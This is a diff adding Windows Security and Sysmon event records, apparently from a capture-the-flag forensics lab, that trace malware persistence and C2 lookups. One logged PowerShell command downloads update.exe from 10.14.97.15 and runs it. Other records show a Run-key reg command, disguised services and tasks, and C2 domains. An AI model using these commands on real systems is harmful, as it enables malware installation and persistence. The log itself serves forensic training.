@@ -1,0 +1,524 @@
+
+========================================================================
+Source: Security (All Time).evtx.jsonl
+Timestamp: 2025-07-02 19:08:58.849459+00:00
+Event ID: 4697
+Record ID: 5
+Indicators: update.exe
+Event data:
+{
+  "SubjectUserSid": "S-1-5-21-1966530601-3185510712-10604624-500",
+  "SubjectUserName": "Administrator",
+  "SubjectDomainName": "THM-DFIR-VM-3",
+  "SubjectLogonId": "0x000000000003d349",
+  "ServiceName": "edgeupdate",
+  "ServiceFileName": "\"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\" /svc",
+  "ServiceType": "0x00000010",
+  "ServiceStartType": "2",
+  "ServiceAccount": "LocalSystem",
+  "ClientProcessStartKey": "79094468455694809",
+  "ClientProcessId": "5376",
+  "ParentProcessId": "2880"
+}
+
+========================================================================
+Source: Security (All Time).evtx.jsonl
+Timestamp: 2025-07-02 19:08:58.856899+00:00
+Event ID: 4697
+Record ID: 6
+Indicators: update.exe
+Event data:
+{
+  "SubjectUserSid": "S-1-5-21-1966530601-3185510712-10604624-500",
+  "SubjectUserName": "Administrator",
+  "SubjectDomainName": "THM-DFIR-VM-3",
+  "SubjectLogonId": "0x000000000003d349",
+  "ServiceName": "edgeupdatem",
+  "ServiceFileName": "\"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\" /medsvc",
+  "ServiceType": "0x00000010",
+  "ServiceStartType": "3",
+  "ServiceAccount": "LocalSystem",
+  "ClientProcessStartKey": "79094468455694809",
+  "ClientProcessId": "5376",
+  "ParentProcessId": "2880"
+}
+
+========================================================================
+Source: Security (All Time).evtx.jsonl
+Timestamp: 2025-07-02 19:08:58.897251+00:00
+Event ID: 4698
+Record ID: 7
+Indicators: update.exe
+Event data:
+{
+  "SubjectUserSid": "S-1-5-21-1966530601-3185510712-10604624-500",
+  "SubjectUserName": "Administrator",
+  "SubjectDomainName": "THM-DFIR-VM-3",
+  "SubjectLogonId": "0x000000000003d349",
+  "TaskName": "\\MicrosoftEdgeUpdateTaskMachineCore{5719D3C3-ED7A-4725-894F-171A87B4BCED}",
+  "TaskContent": "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n  <RegistrationInfo>\n    <Version>1.3.195.61</Version>\n    <Description>Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.</Description>\n    <URI>\\MicrosoftEdgeUpdateTaskMachineCore{5719D3C3-ED7A-4725-894F-171A87B4BCED}</URI>\n  </RegistrationInfo>\n  <Triggers>\n    <LogonTrigger>\n      <Enabled>true</Enabled>\n    </LogonTrigger>\n    <CalendarTrigger>\n      <StartBoundary>2025-07-02T19:43:58</StartBoundary>\n      <ScheduleByDay>\n        <DaysInterval>1</DaysInterval>\n      </ScheduleByDay>\n    </CalendarTrigger>\n  </Triggers>\n  <Principals>\n    <Principal id=\"Author\">\n      <UserId>S-1-5-18</UserId>\n      <RunLevel>HighestAvailable</RunLevel>\n    </Principal>\n  </Principals>\n  <Settings>\n    <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>\n    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n    <StartWhenAvailable>true</StartWhenAvailable>\n    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n    <Enabled>true</Enabled>\n    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n    <WakeToRun>false</WakeToRun>\n    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\n    <Priority>4</Priority>\n  </Settings>\n  <Actions Context=\"Author\">\n    <Exec>\n      <Command>C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe</Command>\n      <Arguments>/c</Arguments>\n    </Exec>\n  </Actions>\n</Task>",
+  "ClientProcessStartKey": "79094468455694808",
+  "ClientProcessId": "2880",
+  "ParentProcessId": "6660",
+  "RpcCallClientLocality": "0",
+  "FQDN": "THM-DFIR-VM-3"
+}
+
+========================================================================
+Source: Security (All Time).evtx.jsonl
+Timestamp: 2025-07-02 19:08:58.909645+00:00
+Event ID: 4698
+Record ID: 8
+Indicators: update.exe
+Event data:
+{
+  "SubjectUserSid": "S-1-5-21-1966530601-3185510712-10604624-500",
+  "SubjectUserName": "Administrator",
+  "SubjectDomainName": "THM-DFIR-VM-3",
+  "SubjectLogonId": "0x000000000003d349",
+  "TaskName": "\\MicrosoftEdgeUpdateTaskMachineUA{BDDE013B-CC8F-4770-B1FB-E892E0392EC8}",
+  "TaskContent": "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n  <RegistrationInfo>\n    <Version>1.3.195.61</Version>\n    <Description>Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.</Description>\n    <URI>\\MicrosoftEdgeUpdateTaskMachineUA{BDDE013B-CC8F-4770-B1FB-E892E0392EC8}</URI>\n  </RegistrationInfo>\n  <Triggers>\n    <CalendarTrigger>\n      <StartBoundary>2025-07-02T19:13:58</StartBoundary>\n      <Repetition>\n        <Interval>PT1H</Interval>\n        <Duration>P1D</Duration>\n      </Repetition>\n      <ScheduleByDay>\n        <DaysInterval>1</DaysInterval>\n      </ScheduleByDay>\n    </CalendarTrigger>\n  </Triggers>\n  <Principals>\n    <Principal id=\"Author\">\n      <UserId>S-1-5-18</UserId>\n      <RunLevel>HighestAvailable</RunLevel>\n    </Principal>\n  </Principals>\n  <Settings>\n    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n    <StartWhenAvailable>true</StartWhenAvailable>\n    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n    <Enabled>true</Enabled>\n    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n    <WakeToRun>false</WakeToRun>\n    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\n    <Priority>4</Priority>\n  </Settings>\n  <Actions Context=\"Author\">\n    <Exec>\n      <Command>C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe</Command>\n      <Arguments>/ua /installsource scheduler</Arguments>\n    </Exec>\n  </Actions>\n</Task>",
+  "ClientProcessStartKey": "79094468455694808",
+  "ClientProcessId": "2880",
+  "ParentProcessId": "6660",
+  "RpcCallClientLocality": "0",
+  "FQDN": "THM-DFIR-VM-3"
+}
+
+========================================================================
+Source: Security (All Time).evtx.jsonl
+Timestamp: 2025-07-02 19:09:16.288832+00:00
+Event ID: 4697
+Record ID: 12
+Indicators: Data Protection Service, nessie.exe
+Event data:
+{
+  "SubjectUserSid": "S-1-5-21-1966530601-3185510712-10604624-500",
+  "SubjectUserName": "Administrator",
+  "SubjectDomainName": "THM-DFIR-VM-3",
+  "SubjectLogonId": "0x000000000003d349",
+  "ServiceName": "Data Protection Service",
+  "ServiceFileName": "C:\\Windows\\Help\\nessie.exe",
+  "ServiceType": "0x00000010",
+  "ServiceStartType": "2",
+  "ServiceAccount": "LocalSystem",
+  "ClientProcessStartKey": "79094468455694824",
+  "ClientProcessId": "5932",
+  "ParentProcessId": "6616"
+}
+
+========================================================================
+Source: Security (All Time).evtx.jsonl
+Timestamp: 2025-07-02 19:09:53.269659+00:00
+Event ID: 4698
+Record ID: 17
+Indicators: update.exe
+Event data:
+{
+  "SubjectUserSid": "S-1-5-18",
+  "SubjectUserName": "THM-DFIR-VM-3$",
+  "SubjectDomainName": "WORKGROUP",
+  "SubjectLogonId": "0x00000000000003e7",
+  "TaskName": "\\MicrosoftEdgeUpdateBrowserReplacementTask",
+  "TaskContent": "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n  <RegistrationInfo>\n    <Version>1.3.195.61</Version>\n    <Description>Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.</Description>\n    <URI>\\MicrosoftEdgeUpdateBrowserReplacementTask</URI>\n  </RegistrationInfo>\n  <Triggers>\n    <BootTrigger>\n      <Enabled>true</Enabled>\n    </BootTrigger>\n  </Triggers>\n  <Principals>\n    <Principal id=\"Author\">\n      <UserId>S-1-5-18</UserId>\n      <RunLevel>HighestAvailable</RunLevel>\n    </Principal>\n  </Principals>\n  <Settings>\n    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n    <StartWhenAvailable>true</StartWhenAvailable>\n    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n    <Enabled>true</Enabled>\n    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n    <WakeToRun>false</WakeToRun>\n    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\n    <Priority>4</Priority>\n  </Settings>\n  <Actions Context=\"Author\">\n    <Exec>\n      <Command>C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe</Command>\n      <Arguments>/browserreplacement</Arguments>\n    </Exec>\n  </Actions>\n</Task>",
+  "ClientProcessStartKey": "79094468455694819",
+  "ClientProcessId": "2092",
+  "ParentProcessId": "576",
+  "RpcCallClientLocality": "0",
+  "FQDN": "THM-DFIR-VM-3"
+}
+
+========================================================================
+Source: Security (All Time).evtx.jsonl
+Timestamp: 2025-07-02 19:10:09.332184+00:00
+Event ID: 4698
+Record ID: 18
+Indicators: AmazonSync, troy.exe
+Event data:
+{
+  "SubjectUserSid": "S-1-5-21-1966530601-3185510712-10604624-500",
+  "SubjectUserName": "Administrator",
+  "SubjectDomainName": "THM-DFIR-VM-3",
+  "SubjectLogonId": "0x000000000003d349",
+  "TaskName": "\\AmazonSync",
+  "TaskContent": "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n  <RegistrationInfo>\n    <Date>2025-07-02T19:10:09</Date>\n    <Author>THM-DFIR-VM-3\\Administrator</Author>\n    <URI>\\AmazonSync</URI>\n  </RegistrationInfo>\n  <Triggers>\n    <BootTrigger>\n      <StartBoundary>2025-07-02T19:10:00</StartBoundary>\n      <Enabled>true</Enabled>\n    </BootTrigger>\n  </Triggers>\n  <Settings>\n    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>\n    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\n    <AllowHardTerminate>true</AllowHardTerminate>\n    <StartWhenAvailable>false</StartWhenAvailable>\n    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n    <IdleSettings>\n      <Duration>PT10M</Duration>\n      <WaitTimeout>PT1H</WaitTimeout>\n      <StopOnIdleEnd>true</StopOnIdleEnd>\n      <RestartOnIdle>false</RestartOnIdle>\n    </IdleSettings>\n    <AllowStartOnDemand>true</AllowStartOnDemand>\n    <Enabled>true</Enabled>\n    <Hidden>false</Hidden>\n    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n    <WakeToRun>false</WakeToRun>\n    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\n    <Priority>7</Priority>\n  </Settings>\n  <Actions Context=\"Author\">\n    <Exec>\n      <Command>\"C:\\Program Files\\Common Files\\troy.exe\"</Command>\n    </Exec>\n  </Actions>\n  <Principals>\n    <Principal id=\"Author\">\n      <UserId>S-1-5-18</UserId>\n      <RunLevel>LeastPrivilege</RunLevel>\n    </Principal>\n  </Principals>\n</Task>",
+  "ClientProcessStartKey": "79094468455694864",
+  "ClientProcessId": "992",
+  "ParentProcessId": "6616",
+  "RpcCallClientLocality": "0",
+  "FQDN": "THM-DFIR-VM-3"
+}
+
+========================================================================
+Source: Sysmon (After Reboot) (copy 1).evtx.jsonl
+Timestamp: 2025-07-04 22:14:07.192060+00:00
+Event ID: 1
+Record ID: 64
+Indicators: troy.exe
+Event data:
+{
+  "RuleName": "-",
+  "UtcTime": "2025-07-04 22:14:05.143",
+  "ProcessGuid": "{c5d2b969-522d-6868-3400-000000001d01}",
+  "ProcessId": "2176",
+  "Image": "C:\\Program Files\\Common Files\\troy.exe",
+  "FileVersion": "-",
+  "Description": "-",
+  "Product": "-",
+  "Company": "-",
+  "OriginalFileName": "-",
+  "CommandLine": "\"C:\\Program Files\\Common Files\\troy.exe\" -d",
+  "CurrentDirectory": "C:\\Windows\\system32\\",
+  "User": "NT AUTHORITY\\SYSTEM",
+  "LogonGuid": "{c5d2b969-522b-6868-e703-000000000000}",
+  "LogonId": "0x00000000000003e7",
+  "TerminalSessionId": "0",
+  "IntegrityLevel": "System",
+  "Hashes": "MD5=F4265DB4679867C723C70911ED96389C,SHA256=B7BC2BC792E164D019B705CFE6EF99F3C50004E85FD2791B47223F534DC47E92,IMPHASH=D42595B695FC008EF2C56AABD8EFD68E",
+  "ParentProcessGuid": "{c5d2b969-522c-6868-2600-000000001d01}",
+  "ParentProcessId": "1540",
+  "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+  "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule",
+  "ParentUser": "NT AUTHORITY\\SYSTEM"
+}
+
+========================================================================
+Source: Sysmon (After Reboot) (copy 1).evtx.jsonl
+Timestamp: 2025-07-04 22:14:07.196959+00:00
+Event ID: 1
+Record ID: 69
+Indicators: nessie.exe
+Event data:
+{
+  "RuleName": "-",
+  "UtcTime": "2025-07-04 22:14:05.506",
+  "ProcessGuid": "{c5d2b969-522d-6868-3e00-000000001d01}",
+  "ProcessId": "2540",
+  "Image": "C:\\Windows\\Help\\nessie.exe",
+  "FileVersion": "-",
+  "Description": "-",
+  "Product": "-",
+  "Company": "-",
+  "OriginalFileName": "-",
+  "CommandLine": "C:\\Windows\\Help\\nessie.exe",
+  "CurrentDirectory": "C:\\Windows\\system32\\",
+  "User": "NT AUTHORITY\\SYSTEM",
+  "LogonGuid": "{c5d2b969-522b-6868-e703-000000000000}",
+  "LogonId": "0x00000000000003e7",
+  "TerminalSessionId": "0",
+  "IntegrityLevel": "System",
+  "Hashes": "MD5=1FFACF0EFEBAE8C5A94CCFF236289560,SHA256=07F4C2B083282F1BBF2F0F2F4BF06750DE7D8B3B23AB1DB3D3B3F8F3A9352FDD,IMPHASH=D42595B695FC008EF2C56AABD8EFD68E",
+  "ParentProcessGuid": "{c5d2b969-522a-6868-0b00-000000001d01}",
+  "ParentProcessId": "568",
+  "ParentImage": "C:\\Windows\\System32\\services.exe",
+  "ParentCommandLine": "C:\\Windows\\system32\\services.exe",
+  "ParentUser": "NT AUTHORITY\\SYSTEM"
+}
+
+========================================================================
+Source: Sysmon (After Reboot) (copy 1).evtx.jsonl
+Timestamp: 2025-07-04 22:14:08.008406+00:00
+Event ID: 22
+Record ID: 91
+Indicators: troy.exe
+Event data:
+{
+  "RuleName": "-",
+  "UtcTime": "2025-07-04 22:14:07.501",
+  "ProcessGuid": "{c5d2b969-522d-6868-3400-000000001d01}",
+  "ProcessId": "2176",
+  "QueryName": "troy-c2.apt057.thm",
+  "QueryStatus": "9003",
+  "QueryResults": "-",
+  "Image": "C:\\Program Files\\Common Files\\troy.exe",
+  "User": "NT AUTHORITY\\SYSTEM"
+}
+
+========================================================================
+Source: Sysmon (After Reboot).evtx.jsonl
+Timestamp: 2025-07-04 22:16:35.339523+00:00
+Event ID: 1
+Record ID: 5
+Indicators: update.exe
+Event data:
+{
+  "RuleName": "-",
+  "UtcTime": "2025-07-04 22:16:35.331",
+  "ProcessGuid": "{c5d2b969-52c3-6868-8b00-000000001d01}",
+  "ProcessId": "4168",
+  "Image": "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe",
+  "FileVersion": "1.3.195.61",
+  "Description": "Microsoft Edge Update",
+  "Product": "Microsoft Edge Update",
+  "Company": "Microsoft Corporation",
+  "OriginalFileName": "msedgeupdate.dll",
+  "CommandLine": "\"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\" /ua /installsource core",
+  "CurrentDirectory": "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\1.3.195.61\\",
+  "User": "NT AUTHORITY\\SYSTEM",
+  "LogonGuid": "{c5d2b969-522b-6868-e703-000000000000}",
+  "LogonId": "0x00000000000003e7",
+  "TerminalSessionId": "0",
+  "IntegrityLevel": "System",
+  "Hashes": "MD5=570D4E78E4EF679C9435247685F8A8D3,SHA256=5CDF1C3C7F72120CA88145D38E48C9E1E6A6BD4EF43021193FD76D98D2F05496,IMPHASH=CD3B2D99C6655A5D4A14E30E380F5BF9",
+  "ParentProcessGuid": "{c5d2b969-52c2-6868-8400-000000001d01}",
+  "ParentProcessId": "2840",
+  "ParentImage": "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe",
+  "ParentCommandLine": "\"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\" /c",
+  "ParentUser": "NT AUTHORITY\\SYSTEM"
+}
+
+========================================================================
+Source: Sysmon (After Reboot).evtx.jsonl
+Timestamp: 2025-07-04 22:16:49.013077+00:00
+Event ID: 1
+Record ID: 20
+Indicators: kitten.exe
+Event data:
+{
+  "RuleName": "-",
+  "UtcTime": "2025-07-04 22:16:48.892",
+  "ProcessGuid": "{c5d2b969-52d0-6868-9d00-000000001d01}",
+  "ProcessId": "5284",
+  "Image": "C:\\Users\\Public\\kitten.exe",
+  "FileVersion": "-",
+  "Description": "-",
+  "Product": "-",
+  "Company": "-",
+  "OriginalFileName": "-",
+  "CommandLine": "\"C:\\Users\\Public\\kitten.exe\" -d",
+  "CurrentDirectory": "C:\\Windows\\system32\\",
+  "User": "THM-DFIR-VM-3\\Administrator",
+  "LogonGuid": "{c5d2b969-52c2-6868-73b1-040000000000}",
+  "LogonId": "0x000000000004b173",
+  "TerminalSessionId": "2",
+  "IntegrityLevel": "High",
+  "Hashes": "MD5=EBA02DEA9B9A38BA0B5DCA7CCC06CBFB,SHA256=0E59A4A774FCFDA2AAD8B2EC1AD16FB54012415BE472F21F60B7898E723528B2,IMPHASH=D42595B695FC008EF2C56AABD8EFD68E",
+  "ParentProcessGuid": "{c5d2b969-52c3-6868-8d00-000000001d01}",
+  "ParentProcessId": "4312",
+  "ParentImage": "C:\\Windows\\explorer.exe",
+  "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
+  "ParentUser": "THM-DFIR-VM-3\\Administrator"
+}
+
+========================================================================
+Source: Sysmon (After Reboot).evtx.jsonl
+Timestamp: 2025-07-04 22:16:49.302486+00:00
+Event ID: 5
+Record ID: 21
+Indicators: kitten.exe
+Event data:
+{
+  "RuleName": "-",
+  "UtcTime": "2025-07-04 22:16:49.301",
+  "ProcessGuid": "{c5d2b969-52d0-6868-9d00-000000001d01}",
+  "ProcessId": "5284",
+  "Image": "C:\\Users\\Public\\kitten.exe",
+  "User": "THM-DFIR-VM-3\\Administrator"
+}
+
+========================================================================
+Source: Sysmon (After Reboot).evtx.jsonl
+Timestamp: 2025-07-04 22:16:51.334368+00:00
+Event ID: 22
+Record ID: 25
+Indicators: kitten.exe
+Event data:
+{
+  "RuleName": "-",
+  "UtcTime": "2025-07-04 22:16:49.301",
+  "ProcessGuid": "{c5d2b969-52d0-6868-9d00-000000001d01}",
+  "ProcessId": "5284",
+  "QueryName": "kitten-c2.apt057.thm",
+  "QueryStatus": "9003",
+  "QueryResults": "-",
+  "Image": "C:\\Users\\Public\\kitten.exe",
+  "User": "THM-DFIR-VM-3\\Administrator"
+}
+
+========================================================================
+Source: Sysmon (Before Reboot).evtx.jsonl
+Timestamp: 2025-07-04 22:09:44.493685+00:00
+Event ID: 1
+Record ID: 15
+Indicators: kitten.exe
+Event data:
+{
+  "RuleName": "-",
+  "UtcTime": "2025-07-04 22:09:44.491",
+  "ProcessGuid": "{c5d2b969-5128-6868-3501-000000001c01}",
+  "ProcessId": "5200",
+  "Image": "C:\\Windows\\System32\\reg.exe",
+  "FileVersion": "10.0.17763.1 (WinBuild.160101.0800)",
+  "Description": "Registry Console Tool",
+  "Product": "Microsoft® Windows® Operating System",
+  "Company": "Microsoft Corporation",
+  "OriginalFileName": "reg.exe",
+  "CommandLine": "reg  add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Basket /t REG_SZ /d \"C:\\Users\\Public\\kitten.exe\"",
+  "CurrentDirectory": "C:\\Users\\Administrator\\Desktop\\",
+  "User": "THM-DFIR-VM-3\\Administrator",
+  "LogonGuid": "{c5d2b969-45fb-6868-863d-040000000000}",
+  "LogonId": "0x0000000000043d86",
+  "TerminalSessionId": "2",
+  "IntegrityLevel": "High",
+  "Hashes": "MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC",
+  "ParentProcessGuid": "{c5d2b969-503c-6868-1e01-000000001c01}",
+  "ParentProcessId": "3192",
+  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+  "ParentCommandLine": "cmd",
+  "ParentUser": "THM-DFIR-VM-3\\Administrator"
+}
+
+========================================================================
+Source: Sysmon (Before Reboot).evtx.jsonl
+Timestamp: 2025-07-04 22:09:47.424625+00:00
+Event ID: 13
+Record ID: 16
+Indicators: kitten.exe
+Event data:
+{
+  "RuleName": "T1060,RunKey",
+  "EventType": "SetValue",
+  "UtcTime": "2025-07-04 22:09:47.409",
+  "ProcessGuid": "{c5d2b969-5128-6868-3501-000000001c01}",
+  "ProcessId": "5200",
+  "Image": "C:\\Windows\\system32\\reg.exe",
+  "TargetObject": "HKU\\S-1-5-21-1966530601-3185510712-10604624-500\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Basket",
+  "Details": "C:\\Users\\Public\\kitten.exe",
+  "User": "THM-DFIR-VM-3\\Administrator"
+}
+
+========================================================================
+Source: Sysmon.evtx.jsonl
+Timestamp: 2025-07-02 20:13:58.536577+00:00
+Event ID: 1
+Record ID: 10
+Indicators: update.exe
+Event data:
+{
+  "RuleName": "-",
+  "UtcTime": "2025-07-02 20:13:58.534",
+  "ProcessGuid": "{c5d2b969-9306-6865-d400-000000001b01}",
+  "ProcessId": "228",
+  "Image": "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe",
+  "FileVersion": "1.3.195.61",
+  "Description": "Microsoft Edge Update",
+  "Product": "Microsoft Edge Update",
+  "Company": "Microsoft Corporation",
+  "OriginalFileName": "msedgeupdate.dll",
+  "CommandLine": "\"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\" /ua /installsource scheduler",
+  "CurrentDirectory": "C:\\Windows\\system32\\",
+  "User": "NT AUTHORITY\\SYSTEM",
+  "LogonGuid": "{c5d2b969-894f-6865-e703-000000000000}",
+  "LogonId": "0x00000000000003e7",
+  "TerminalSessionId": "0",
+  "IntegrityLevel": "System",
+  "Hashes": "MD5=570D4E78E4EF679C9435247685F8A8D3,SHA256=5CDF1C3C7F72120CA88145D38E48C9E1E6A6BD4EF43021193FD76D98D2F05496,IMPHASH=CD3B2D99C6655A5D4A14E30E380F5BF9",
+  "ParentProcessGuid": "{c5d2b969-8950-6865-2600-000000001b01}",
+  "ParentProcessId": "1476",
+  "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+  "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule",
+  "ParentUser": "NT AUTHORITY\\SYSTEM"
+}
+
+========================================================================
+Source: Sysmon.evtx.jsonl
+Timestamp: 2025-07-02 20:14:12.680626+00:00
+Event ID: 1
+Record ID: 18
+Indicators: update.exe
+Event data:
+{
+  "RuleName": "-",
+  "UtcTime": "2025-07-02 20:14:12.679",
+  "ProcessGuid": "{c5d2b969-9314-6865-d500-000000001b01}",
+  "ProcessId": "3140",
+  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "FileVersion": "10.0.17763.1 (WinBuild.160101.0800)",
+  "Description": "Windows PowerShell",
+  "Product": "Microsoft® Windows® Operating System",
+  "Company": "Microsoft Corporation",
+  "OriginalFileName": "PowerShell.EXE",
+  "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -Command \"iex '$u=\\\"http://10.14.97.15/update.exe\\\";$p=\\\"$env:APPDATA/update.exe\\\";Invoke-WebRequest $u -OutFile $p;Start-Process $p'\"",
+  "CurrentDirectory": "C:\\",
+  "User": "THM-DFIR-VM-3\\Administrator",
+  "LogonGuid": "{c5d2b969-8960-6865-2c98-030000000000}",
+  "LogonId": "0x000000000003982c",
+  "TerminalSessionId": "2",
+  "IntegrityLevel": "High",
+  "Hashes": "MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F",
+  "ParentProcessGuid": "{c5d2b969-8961-6865-7d00-000000001b01}",
+  "ParentProcessId": "3604",
+  "ParentImage": "C:\\Windows\\explorer.exe",
+  "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
+  "ParentUser": "THM-DFIR-VM-3\\Administrator"
+}
+
+========================================================================
+Source: Sysmon.evtx.jsonl
+Timestamp: 2025-07-02 20:14:13.456669+00:00
+Event ID: 11
+Record ID: 20
+Indicators: update.exe
+Event data:
+{
+  "RuleName": "EXE",
+  "UtcTime": "2025-07-02 20:14:13.444",
+  "ProcessGuid": "{c5d2b969-9314-6865-d500-000000001b01}",
+  "ProcessId": "3140",
+  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "TargetFilename": "C:\\Users\\Administrator\\AppData\\Roaming\\update.exe",
+  "CreationUtcTime": "2025-07-02 20:14:13.444",
+  "User": "THM-DFIR-VM-3\\Administrator"
+}
+
+========================================================================
+Source: Sysmon.evtx.jsonl
+Timestamp: 2025-07-02 20:14:28.351181+00:00
+Event ID: 1
+Record ID: 22
+Indicators: update.exe
+Event data:
+{
+  "RuleName": "-",
+  "UtcTime": "2025-07-02 20:14:28.317",
+  "ProcessGuid": "{c5d2b969-9324-6865-d700-000000001b01}",
+  "ProcessId": "4340",
+  "Image": "C:\\Users\\Administrator\\AppData\\Roaming\\update.exe",
+  "FileVersion": "-",
+  "Description": "-",
+  "Product": "-",
+  "Company": "-",
+  "OriginalFileName": "-",
+  "CommandLine": "\"C:\\Users\\Administrator\\AppData\\Roaming\\update.exe\" ",
+  "CurrentDirectory": "C:\\",
+  "User": "THM-DFIR-VM-3\\Administrator",
+  "LogonGuid": "{c5d2b969-8960-6865-2c98-030000000000}",
+  "LogonId": "0x000000000003982c",
+  "TerminalSessionId": "2",
+  "IntegrityLevel": "High",
+  "Hashes": "MD5=2B34256B70CF7263656C125B2A981391,SHA256=B99076499729D423B209C2D434FDB62839D0DF2524A1669085E3C053D8F70C79,IMPHASH=D42595B695FC008EF2C56AABD8EFD68E",
+  "ParentProcessGuid": "{c5d2b969-9314-6865-d500-000000001b01}",
+  "ParentProcessId": "3140",
+  "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "ParentCommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -Command \"iex '$u=\\\"http://10.14.97.15/update.exe\\\";$p=\\\"$env:APPDATA/update.exe\\\";Invoke-WebRequest $u -OutFile $p;Start-Process $p'\"",
+  "ParentUser": "THM-DFIR-VM-3\\Administrator"
+}
+
+========================================================================
+Source: Sysmon.evtx.jsonl
+Timestamp: 2025-07-02 20:14:30.581535+00:00
+Event ID: 22
+Record ID: 23
+Indicators: update.exe
+Event data:
+{
+  "RuleName": "-",
+  "UtcTime": "2025-07-02 20:14:28.636",
+  "ProcessGuid": "{c5d2b969-9324-6865-d700-000000001b01}",
+  "ProcessId": "4340",
+  "QueryName": "route.m365officesync.workers.dev",
+  "QueryStatus": "9003",
+  "QueryResults": "-",
+  "Image": "C:\\Users\\Administrator\\AppData\\Roaming\\update.exe",
+  "User": "THM-DFIR-VM-3\\Administrator"
+}
